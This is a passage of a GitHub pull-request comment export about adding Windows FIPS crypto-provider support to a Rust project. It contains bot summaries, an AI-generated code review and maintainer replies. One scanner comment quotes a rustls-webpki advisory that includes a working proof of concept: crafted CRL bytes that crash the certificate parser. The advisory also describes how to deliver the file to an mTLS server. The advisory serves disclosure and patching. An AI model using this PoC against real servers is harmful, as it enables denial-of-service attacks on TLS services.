pply immediately.\r\n\r\nInstall in minutes. Integrates seamlessly into your existing workflows.\r\n\r\n## Qodo is designed for developers who:\r\n- Handle frequent pull requests and need reliable review coverage\r\n- Balance code quality with fast delivery\r\n- Work in complex, multi-repo systems\r\n- Use AI-generated code and need stronger guardrails\r\n- Build production software where reliability matters\r\n\r\n## Qodo Capabilities\r\n- ## Automated PR Analysis\r\n  - Reviews every pull request automatically\r\n  - No manual trigger required\r\n\r\n- ## Context-Aware Code Review\r\n  - Understands cross-file changes\r\n  - Detects architectural inconsistencies\r\n\r\n- ## Actionable Suggestions\r\n  - Concrete code fixes\r\n  - Clear explanations\r\n  - Prioritized feedback\r\n\r\n- ## Security & Reliability Checks\r\n  - Identifies risky patterns\r\n  - Reduces attack surface area","external_url":"https://www.qodo.ai/","html_url":"https://github.com/apps/qodo-code-review","created_at":"2023-11-16T16:18:38Z","updated_at":"2026-05-06T15:53:40Z","permissions":{"actions":"read","checks":"read","contents":"write","discussions":"write","issues":"write","metadata":"read","pull_requests":"write"},"events":["check_run","check_suite","discussion_comment","issue_comment","pull_request","pull_request_review_comment","push"]}},{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/issues/comments/4468272387","html_url":"https://github.com/cyberfabric/cyberware-rust/pull/1924#issuecomment-4468272387","issue_url":"https://api.github.com/repos/cyberfabric/cyberware-rust/issues/1924","id":4468272387,"node_id":"IC_kwDOPaLyBs8AAAABClRtAw","user":{"login":"coderabbitai[bot]","id":136622811,"node_id":"BOT_kgDOCCSy2w","avatar_url":"https://avatars.githubusercontent.com/in/347564?v=4","gravatar_id":"","url":"https://api.github.com/users/coderabbitai%5Bbot%5D","html_url":"https://github.com/apps/coderabbitai","followers_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/followers","following_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/repos","events_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/coderabbitai%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"created_at":"2026-05-16T21:45:12Z","updated_at":"2026-05-16T22:15:05Z","body":"<!-- This is an auto-generated comment: summarize by coderabbit.ai -->\n<details>\n<summary>ℹ️ Recent review info</summary>\n\n<details>\n<summary>⚙️ Run configuration</summary>\n\n**Configuration used**: defaults\n\n**Review profile**: CHILL\n\n**Plan**: Free\n\n**Run ID**: `f36542f3-3bce-4fdc-9e6d-325ec5219b51`\n\n</details>\n\n<details>\n<summary>📥 Commits</summary>\n\nReviewing files that changed from the base of the PR and between 701d809e3ecc273dfc3e9740961c1edf13985aa0 and 60b457e60e13b909bb7ab4878617907e66f427f6.\n\n</details>\n\n<details>\n<summary>⛔ Files ignored due to path filters (1)</summary>\n\n* `Cargo.lock` is excluded by `!**/*.lock`\n\n</details>\n\n<details>\n<summary>📒 Files selected for processing (12)</summary>\n\n* `Cargo.toml`\n* `Makefile`\n* `README.md`\n* `deny.toml`\n* `docs/security/fips/adrs/0001-macos-fips-via-corecrypto-provider.md`\n* `examples/cyberware-fips-probe/README.md`\n* `examples/cyberware-fips-probe/src/main.rs`\n* `libs/modkit-http/Cargo.toml`\n* `libs/modkit-http/src/tls.rs`\n* `libs/modkit/Cargo.toml`\n* `libs/modkit/src/bootstrap/crypto.rs`\n* `libs/rustls-fips-shim/Cargo.toml`\n\n</details>\n\n<details>\n<summary>✅ Files skipped from review due to trivial changes (3)</summary>\n\n* deny.toml\n* docs/security/fips/adrs/0001-macos-fips-via-corecrypto-provider.md\n* examples/cyberware-fips-probe/README.md\n\n</details>\n\n<details>\n<summary>🚧 Files skipped from review as they are similar to previous changes (9)</summary>\n\n* examples/cyberware-fips-probe/src/main.rs\n* Cargo.toml\n* libs/rustls-fips-shim/Cargo.toml\n* Makefile\n* libs/modkit-http/Cargo.toml\n* README.md\n* libs/modkit-http/src/tls.rs\n* libs/modkit/Cargo.toml\n* libs/modkit/src/bootstrap/crypto.rs\n\n</details>\n\n</details>\n\n---\n<!-- walkthrough_start -->\n\n<details>\n<summary>📝 Walkthrough</summary>\n\n## Walkthrough\n\nThis PR integrates Windows FIPS 140-3 support via the `rustls-cng-crypto` provider. It adds workspace dependencies, gates the Windows CNG provider behind the `fips` feature across multiple Cargo manifests, implements fail-closed bootstrap logic when system-wide FIPS mode is disabled, adds cross-compilation verification infrastructure, and expands documentation with Windows prerequisites and verification procedures.\n\n## Changes\n\n**Windows FIPS Provider Integration**\n\n|Layer / File(s)|Summary|\n|---|---|\n|**Workspace dependency and licensing** <br> `Cargo.toml`, `deny.toml`|Add rustls-cng-crypto as a workspace dependency with FIPS feature enabled, and permit OpenSSL license for the Windows CNG provider.|\n|**FIPS feature wiring across Cargo.toml files** <br> `libs/modkit/Cargo.toml`, `libs/modkit-http/Cargo.toml`, `libs/rustls-fips-shim/Cargo.toml`|Configure the `fips` feature to activate Windows CNG provider on Windows, AWS-LC FIPS on supported Linux/other targets, and macOS corecrypto on macOS; target-gate Windows dependency to Windows builds only.|\n|**Windows FIPS bootstrap and provider selection** <br> `libs/modkit/src/bootstrap/crypto.rs`, `libs/modkit-http/src/tls.rs`|Implement `SystemFipsModeNotEnabled` error for fail-closed behavior when OS FIPS mode is disabled; detect FIPS capability via rustls-cng-crypto and select the appropriate provider per OS, with Windows CNG as the exclusive FIPS provider on Windows.|\n|**Build verification infrastructure** <br> `Makefile`|Add conditional NASM installation for Windows toolchain setup; introduce `check-windows-fips` phony target for cross-compilation verification with cargo-xwin and the Windows MSVC Rust target.|\n|**Documentation and examples** <br> `README.md`, `docs/security/fips/adrs/0001-macos-fips-via-corecrypto-provider.md`, `examples/cyberware-fips-probe/README.md`, `examples/cyberware-fips-probe/src/main.rs`|Expand main README with per-OS FIPS provider mapping, wire-level enforcement table, build prerequisites, Windows FIPS mode requirements, and verification procedures; update ADR scope to include Windows; document Windows setup and smoke-test procedures in probe example; adjust probe startup FIPS target messaging.|\n\n## Estimated code review effort\n\n🎯 3 (Moderate) | ⏱️ ~25 minutes\n\n## Poem\n\n> 🐰 *On Windows doth the CNG dance,*  \n> *Fail-closed when FIPS slips its stance,*  \n> *Cross-compile checked with xwin's might,*  \n> *Wire-locked encryption, burning bright!*  \n> *Documentation blooms, the path is clear,*  \n> *A rustls tale for Windows cheer!* 🔐\n\n</details>\n\n<!-- walkthrough_end -->\n<!-- tips_start -->\n\n---\n\n> [!NOTE]\n> <details>\n> <summary>🎁 Summarized by CodeRabbit Free</summary>\n> \n> Your organization is on the Free plan. CodeRabbit will generate a high-level summary and a walkthrough for each pull request. For a comprehensive line-by-line review, please upgrade your subscription to CodeRabbit Pro by visiting <https://app.coderabbit.ai/login>.\n> \n> </details>\n\n\n<sub>Comment `@coderabbitai help` to get the list of available commands and usage tips.</sub>\n\n<!-- tips_end -->\n<!-- internal state start -->\n\n\n<!--  -->\n\n<!-- internal state end -->","author_association":"CONTRIBUTOR","reactions":{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/issues/comments/4468272387/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":{"id":347564,"client_id":"Iv1.6aaafe4fe882736b","slug":"coderabbitai","node_id":"A_kwHOB96YWc4ABU2s","owner":{"login":"coderabbitai","id":132028505,"node_id":"O_kgDOB96YWQ","avatar_url":"https://avatars.githubusercontent.com/u/132028505?v=4","gravatar_id":"","url":"https://api.github.com/users/coderabbitai","html_url":"https://github.com/coderabbitai","followers_url":"https://api.github.com/users/coderabbitai/followers","following_url":"https://api.github.com/users/coderabbitai/following{/other_user}","gists_url":"https://api.github.com/users/coderabbitai/gists{/gist_id}","starred_url":"https://api.github.com/users/coderabbitai/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/coderabbitai/subscriptions","organizations_url":"https://api.github.com/users/coderabbitai/orgs","repos_url":"https://api.github.com/users/coderabbitai/repos","events_url":"https://api.github.com/users/coderabbitai/events{/privacy}","received_events_url":"https://api.github.com/users/coderabbitai/received_events","type":"Organization","user_view_type":"public","site_admin":false},"name":"coderabbitai","description":"# Transforming Code Reviews with AI\r\n\r\n## Features\r\n\r\n**Automated Reviews**: Continuous reviews of the pull requests including incremental commits. \r\n\r\n**Summarization**: Generates high-level summary and a technical walkthrough of the PR changes. \r\n\r\n**Line-by-line review**: Provides line-by-line suggestions committable with one click.\r\n\r\n**Codebase verification**:  Verifies the impact on the overall codebase and identifies missing changes.\r\n\r\n**Insights into your code**:  Ask any questions on your codebase within the pull request \r\n\r\n**Chat about your code** : Chat with the bot around your code. The more you chat, the smarter it gets.\r\n\r\n**Issue Validation**:  Validates the PR against the linked issues and identifies other related issues \r\n\r\n\r\n\r\n","external_url":"https://coderabbit.ai?utm_source=cr_app&utm_medium=github","html_url":"https://github.com/apps/coderabbitai","created_at":"2023-06-14T15:47:27Z","updated_at":"2026-03-14T07:58:44Z","permissions":{"actions":"read","checks":"write","contents":"write","discussions":"read","issues":"write","members":"read","metadata":"read","pull_requests":"write","statuses":"write"},"events":["issues","issue_comment","label","organization","pull_request","pull_request_review","pull_request_review_comment","pull_request_review_thread","release","repository"]}}],"source_review_comments":[{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253588247","pull_request_review_id":4304368602,"id":3253588247,"node_id":"PRRC_kwDOPaLyBs7B7dEX","diff_hunk":"","path":"Cargo.lock","commit_id":"60b457e60e13b909bb7ab4878617907e66f427f6","original_commit_id":"701d809e3ecc273dfc3e9740961c1edf13985aa0","user":{"login":"aikido-pr-checks[bot]","id":169896070,"node_id":"BOT_kgDOCiBohg","avatar_url":"https://avatars.githubusercontent.com/in/898896?v=4","gravatar_id":"","url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D","html_url":"https://github.com/apps/aikido-pr-checks","followers_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/followers","following_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/repos","events_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/aikido-pr-checks%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"body":"**GHSA-82j2-j2ch-gfr8 in rustls-webpki** - high severity\n### Summary\n\n`bit_string_flags()` in `src/der.rs` panics with an index-out-of-bounds when given a BIT STRING whose content is exactly `[0x00]` (one byte: zero padding bits, zero data bytes). This is reachable through the public API `BorrowedCertRevocationList::from_der()` via the `issuingDistributionPoint` CRL extension.\n\n**Precondition**: CRL checking is opt-in in rustls-webpki. This vulnerability affects only applications that explicitly pass `RevocationOptions` to `verify_for_usage()` and load CRL bytes from a source the attacker can influence. The default rustls configuration (no `RevocationOptions`) is not affected.\n\n> **AI disclosure**: This report was prepared with AI assistance (Claude). The vulnerability was discovered by differential fuzzing against a formally-verified Rust oracle. All technical claims have been independently verified against the live source code before submission.\n\n### Details\n`bit_string_flags()` in `src/der.rs` reads the content of named-bit BIT\nSTRINGs (KeyUsage, ReasonFlags, etc.). Its input guard:\n\n```rust\nif padding_bits > 7 || (raw_bits.is_empty() && padding_bits != 0) {\n    return Err(Error::BadDer);\n}\nlet last_byte = raw_bits[raw_bits.len() - 1];  // ← crash\n```\nmisses the case `padding_bits == 0 && raw_bits.is_empty()`.\nWhen a BIT STRING has content `[0x00]`  (one padding-bits byte set to zero, no data bytes):\n- padding_bits = 0x00 — passes the > 7 check ✓\n- raw_bits = [] — passes is_empty() && != 0 check ✓ (because 0 != 0 is false)\n- raw_bits.len() - 1 = 0usize - 1 = underflow → usize::MAX\n- raw_bits[usize::MAX] → panic\n\n\nDebug:   thread 'main' panicked: attempt to subtract with overflow\nRelease: thread 'main' panicked: index out of bounds: the len is 0\n         but the index is 18446744073709551615\n\n### PoC\nCargo.toml:\n```\n[dependencies]\nrustls-webpki = \"0.102.8\"   # also reproduces on 0.103.12\n```\nsrc/main.rs:\n```\nfn main() {\n    let crl: &[u8] = &[\n        0x30, 0x65, 0x30, 0x50, 0x02, 0x01, 0x01, 0x30, 0x0d, 0x06, 0x09,\n        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00,\n        0x30, 0x0c, 0x31, 0x0a, 0x30, 0x08, 0x06, 0x03, 0x55, 0x04, 0x03,\n        0x13, 0x01, 0x41, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31,\n        0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a, 0x17, 0x0d, 0x32, 0x31,\n        0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5a,\n        0xa0, 0x10, 0x30, 0x0e, 0x30, 0x0c, 0x06, 0x03, 0x55, 0x1d, 0x1c,\n        0x04, 0x05, 0x30, 0x03, 0x83, 0x01, 0x00, 0x30, 0x0d, 0x06, 0x09,\n        0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00,\n        0x03, 0x02, 0x00, 0x00,\n    ];\n    // Panics — never returns\n    let _ = webpki::BorrowedCertRevocationList::from_der(crl);\n}\n```\noutput:\n```\nthread 'main' panicked at src/der.rs:...\nindex out of bounds: the len is 0 but the index is 18446744073709551615\n```\n#### Trigger\n```\na0 10            -- cRLExtensions [0] EXPLICIT\n  30 0e          -- SEQUENCE OF Extension\n    30 0c        -- Extension SEQUENCE\n      06 03 55 1d 1c   -- OID 2.5.29.28 (id-ce-issuingDistributionPoint)\n      04 05            -- OCTET STRING (extnValue)\n        30 03          -- IssuingDistributionPoint SEQUENCE\n          83 01 00     -- [3] onlySomeReasons: BIT STRING, len=1, content=0x00\n                       --   padding_bits=0, data=[]  ← TRIGGER\n```\n\n\n### Impact\n- Who is affected: \nApplications that (1) use rustls-webpki with CRL\nrevocation checking explicitly enabled via RevocationOptions, and (2)\nload CRL bytes from a source an attacker can influence.\n- Attack paths:\n    - mTLS server (most realistic): An attacker obtains any certificate from a CA that permits custom CDP URLs — common in enterprise PKI. They set the CDP to a server they control, serve the 103-byte crafted CRL, and connect to the target. The server fetches the attacker's CRL during the handshake and panics. No MITM required.\n    - TLS client with server-cert CRL checking: An attacker who can MITM an HTTP CRL distribution point (ARP/DNS poisoning on a local network) serves the crafted CRL in place of the legitimate one.\n\n<details><summary>Details</summary>\n\n**Remediation** Aikido suggests bumping this package to version 0.103.13 to resolve this issue\n\n<sub>Reply `@AikidoSec ignore: [REASON]` to ignore this issue.</sub>\n[More info](https://app.aikido.dev/repositories/1513971/pull_requests/1924/latest?groupId=65517)\n</details>","created_at":"2026-05-16T21:45:15Z","updated_at":"2026-05-16T21:45:15Z","html_url":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253588247","pull_request_url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924","_links":{"self":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253588247"},"html":{"href":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253588247"},"pull_request":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924"}},"reactions":{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253588247/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"start_line":null,"original_start_line":null,"start_side":null,"line":1,"original_line":1,"side":"RIGHT","author_association":"NONE","original_position":1,"position":1,"subject_type":"file"},{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253628709","pull_request_review_id":4304412485,"id":3253628709,"node_id":"PRRC_kwDOPaLyBs7B7m8l","diff_hunk":"@@ -87,20 +87,28 @@ pub fn get_crypto_provider() -> Arc<rustls::crypto::CryptoProvider> {\n         .cloned()\n         .unwrap_or_else(|| {\n             // Provider selection mirrors `modkit::bootstrap::init_crypto_provider`:\n-            //   - fips + macOS  → Apple corecrypto, TLS 1.3-only (via\n-            //                     corecrypto-provider's own `fips` feature\n-            //                     that's forwarded by modkit-http's `fips`)\n-            //   - fips + other  → AWS-LC FIPS\n-            //   - non-fips      → AWS-LC default\n-            //\n-            // `default_provider()` under `feature = \"fips\"` is aliased to\n-            // `fips_provider()` semantics by the corecrypto crate itself —\n-            // same single-entry-point pattern as `rustls-cng-crypto`.\n+            //   - fips + macOS    → Apple corecrypto, TLS 1.3-only (via the\n+            //                       corecrypto-provider's own `fips` feature\n+            //                       forwarded by modkit-http's `fips`).\n+            //                       `default_provider()` under `feature = \"fips\"`\n+            //                       is aliased to `fips_provider()` semantics by\n+            //                       the corecrypto crate itself — same single-\n+            //                       entry-point pattern as `rustls-cng-crypto`.\n+            //   - fips + Windows  → Windows CNG (FIPS-Approved set).\n+            //                       No `fips::enabled()` re-check here: that\n+            //                       gate is owned by `init_crypto_provider`\n+            //                       and runs once at startup.\n+            //   - fips + other    → AWS-LC FIPS.\n+            //   - non-fips        → AWS-LC default.\n             #[cfg(all(feature = \"fips\", target_os = \"macos\"))]\n             {\n                 Arc::new(rustls_corecrypto_provider::default_provider())\n             }\n-            #[cfg(all(feature = \"fips\", not(target_os = \"macos\")))]\n+            #[cfg(all(feature = \"fips\", target_os = \"windows\"))]\n+            {\n+                Arc::new(rustls_cng_crypto::fips_provider())\n+            }","path":"libs/modkit-http/src/tls.rs","commit_id":"60b457e60e13b909bb7ab4878617907e66f427f6","original_commit_id":"701d809e3ecc273dfc3e9740961c1edf13985aa0","user":{"login":"Artifizer","id":192502778,"node_id":"U_kgDOC3lb-g","avatar_url":"https://avatars.githubusercontent.com/u/192502778?v=4","gravatar_id":"","url":"https://api.github.com/users/Artifizer","html_url":"https://github.com/Artifizer","followers_url":"https://api.github.com/users/Artifizer/followers","following_url":"https://api.github.com/users/Artifizer/following{/other_user}","gists_url":"https://api.github.com/users/Artifizer/gists{/gist_id}","starred_url":"https://api.github.com/users/Artifizer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Artifizer/subscriptions","organizations_url":"https://api.github.com/users/Artifizer/orgs","repos_url":"https://api.github.com/users/Artifizer/repos","events_url":"https://api.github.com/users/Artifizer/events{/privacy}","received_events_url":"https://api.github.com/users/Artifizer/received_events","type":"User","user_view_type":"public","site_admin":false},"body":"**MEDIUM**\n\nThis fallback returns an empty `CryptoProvider` on Windows when system FIPS mode is disabled, instead of failing closed like `init_crypto_provider` does.\n\n`rustls_cng_crypto::fips_provider()` yields a provider with empty `cipher_suites` / `kx_groups` when `FipsAlgorithmPolicy != 1` (the exact condition the bootstrap branch detects and rejects with `SystemFipsModeNotEnabled`). Here the empty provider is wrapped in an `Arc` and handed back, so any caller that reaches this fallback without going through `init_crypto_provider` on a non-FIPS-mode Windows host gets an unhandshakeable client and an obscure rustls error at connect time — silently degrading the FIPS posture the rest of the change is designed to enforce.\n\nMirror the bootstrap probe: check `provider.cipher_suites.is_empty()` after constructing it and panic (or use `expect_or_log`) with the same `SystemFipsModeNotEnabled` message before wrapping in `Arc`. The asymmetry between `init_crypto_provider` (fail-closed) and `get_crypto_provider` (silently empty) is a latent footgun for any code path that builds an `HttpClient` without invoking bootstrap first.\n\n---\n_Generated by [Claude Code](https://claude.ai/code)_","created_at":"2026-05-16T22:02:22Z","updated_at":"2026-05-16T22:02:27Z","html_url":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253628709","pull_request_url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924","_links":{"self":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253628709"},"html":{"href":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253628709"},"pull_request":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924"}},"reactions":{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253628709/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"start_line":null,"original_start_line":null,"start_side":null,"line":118,"original_line":110,"side":"RIGHT","author_association":"MEMBER","original_position":34,"position":42,"subject_type":"line"},{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253645484","pull_request_review_id":4304430743,"id":3253645484,"node_id":"PRRC_kwDOPaLyBs7B7rCs","diff_hunk":"","path":"Cargo.lock","commit_id":"60b457e60e13b909bb7ab4878617907e66f427f6","original_commit_id":"701d809e3ecc273dfc3e9740961c1edf13985aa0","user":{"login":"MikeFalcon77","id":3686170,"node_id":"MDQ6VXNlcjM2ODYxNzA=","avatar_url":"https://avatars.githubusercontent.com/u/3686170?v=4","gravatar_id":"","url":"https://api.github.com/users/MikeFalcon77","html_url":"https://github.com/MikeFalcon77","followers_url":"https://api.github.com/users/MikeFalcon77/followers","following_url":"https://api.github.com/users/MikeFalcon77/following{/other_user}","gists_url":"https://api.github.com/users/MikeFalcon77/gists{/gist_id}","starred_url":"https://api.github.com/users/MikeFalcon77/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/MikeFalcon77/subscriptions","organizations_url":"https://api.github.com/users/MikeFalcon77/orgs","repos_url":"https://api.github.com/users/MikeFalcon77/repos","events_url":"https://api.github.com/users/MikeFalcon77/events{/privacy}","received_events_url":"https://api.github.com/users/MikeFalcon77/received_events","type":"User","user_view_type":"public","site_admin":false},"body":"Too many words :)\r\n\r\nThe reality is `rustls-webpki 0.102.8` is only a transitive dep of `rustls-cng-crypto` and doesn't resolve into any workspace binary (`cargo tree` shows only `0.103.13` in the build graph). Additionally, we don't use CRL checking (`RevocationOptions` / `BorrowedCertRevocationList`) anywhere — the precondition for this CVE is never met. Will track upstream bump in `rustls-cng-crypto` separately.","created_at":"2026-05-16T22:11:12Z","updated_at":"2026-05-16T22:11:13Z","html_url":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253645484","pull_request_url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924","_links":{"self":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253645484"},"html":{"href":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253645484"},"pull_request":{"href":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/1924"}},"reactions":{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253645484/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"start_line":null,"original_start_line":null,"start_side":null,"line":1,"original_line":1,"side":"RIGHT","in_reply_to_id":3253588247,"author_association":"MEMBER","original_position":1,"position":1,"subject_type":"file"},{"url":"https://api.github.com/repos/cyberfabric/cyberware-rust/pulls/comments/3253649568","pull_request_review_id":4304434117,"id":3253649568,"node_id":"PRRC_kwDOPaLyBs7B7sCg","diff_hunk":"@@ -87,20 +87,28 @@ pub fn get_crypto_provider() -> Arc<rustls::crypto::CryptoProvider> {\n         .cloned()\n         .unwrap_or_else(|| {\n             // Provider selection mirrors `modkit::bootstrap::init_crypto_provider`:\n-            //   - fips + macOS  → Apple corecrypto, TLS 1.3-only (via\n-            //                     corecrypto-provider's own `fips` feature\n-            //                     that's forwarded by modkit-http's `fips`)\n-            //   - fips + other  → AWS-LC FIPS\n-            //   - non-fips      → AWS-LC default\n-            //\n-            // `default_provider()` under `feature = \"fips\"` is aliased to\n-            // `fips_provider()` semantics by the corecrypto crate itself —\n-            // same single-entry-point pattern as `rustls-cng-crypto`.\n+            //   - fips + macOS    → Apple corecrypto, TLS 1.3-only (via the\n+            //                       corecrypto-provider's own `fips` feature\n+            //                       forwarded by modkit-http's `fips`).\n+            //                       `default_provider()` under `feature = \"fips\"`\n+            //                       is aliased to `fips_provider()` semantics by\n+            //                       the corecrypto crate itself — same single-\n+            //                       entry-point pattern as `rustls-cng-crypto`.\n+            //   - fips + Windows  → Windows CNG (FIPS-Approved set).\n+            //                       No `fips::enabled()` re-check here: that\n+            //                       gate is owned by `init_crypto_provider`\n+            //                       and runs once at startup.\n+            //   - fips + other    → AWS-LC FIPS.\n+            //   - non-fips        → AWS-LC default.\n             #[cfg(all(feature = \"fips\", target_os = \"macos\"))]\n             {\n                 Arc::new(rustls_corecrypto_provider::default_provider())\n             }\n-            #[cfg(all(feature = \"fips\", not(target_os = \"macos\")))]\n+            #[cfg(all(feature = \"fips\", target_os = \"windows\"))]\n+            {\n+                Arc::new(rustls_cng_crypto::fips_provider())\n+            }","path":"libs/modkit-http/src/tls.rs","commit_id":"60b457e60e13b909bb7ab4878617907e66f427f6","original_commit_id":"701d809e3ecc273dfc3e9740961c1edf13985aa0","user":{"login":"MikeFalcon77","id":3686170,"node_id":"MDQ6VXNlcjM2ODYxNzA=","avatar_url":"https://avatars.githubusercontent.com/u/3686170?v=4","gravatar_id":"","url":"https://api.github.com/users/MikeFalcon77","html_url":"https://github.com/MikeFalcon77","followers_url":"https://api.github.com/users/MikeFalcon77/followers","following_url":"https://api.github.com/users/MikeFalcon77/following{/other_user}","gists_url":"https://api.github.com/users/MikeFalcon77/gists{/gist_id}","starred_url":"https://api.github.com/users/MikeFalcon77/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/MikeFalcon77/subscriptions","organizations_url":"https://api.github.com/users/MikeFalcon77/orgs","repos_url":"https://api.github.com/users/MikeFalcon77/repos","events_url":"https://api.github.com/users/MikeFalcon77/events{/privacy}","received_events_url":"https://api.github.com/users/MikeFalcon77/received_events","type":"User","user_view_type":"public","site_admin":false},"body":"Fixed. assert is added  into the fallback branch of get_crypto_provider.  Actually this risk is low becuse bootstrat called first, plus build_client_config and apply_fips_hardening will catch empty provider anyway.","created_at":"2026-05-16T22:15:19Z","updated_at":"2026-05-16T22:15:19Z","html_url":"https://github.com/cyberfabric/cyberware-rust/pull/1924#discussion_r3253649568","pull_request_url":"https://